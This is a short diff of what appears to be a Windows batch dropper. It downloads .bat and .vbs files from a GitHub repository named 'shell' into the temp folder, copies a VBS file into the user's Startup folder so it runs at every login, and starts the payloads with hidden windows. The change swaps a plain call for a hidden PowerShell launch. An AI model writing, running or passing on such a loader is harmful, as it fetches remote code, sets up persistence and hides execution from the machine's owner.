@@ -7,5 +7,5 @@ curl https://raw.githubusercontent.com/0x2034/shell/main/post.bat -o "%temp%\pos
 curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%temp%\post.vbs"
 move "%temp%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 powershell -c "Start-Process -FilePath "%temp%\vb.bat" -WindowStyle Hidden"
-call "%temp%\vb1.vbs"
+powershell -c "Start-Process -FilePath "%temp%\vbs.vb1" -WindowStyle Hidden"
 exit
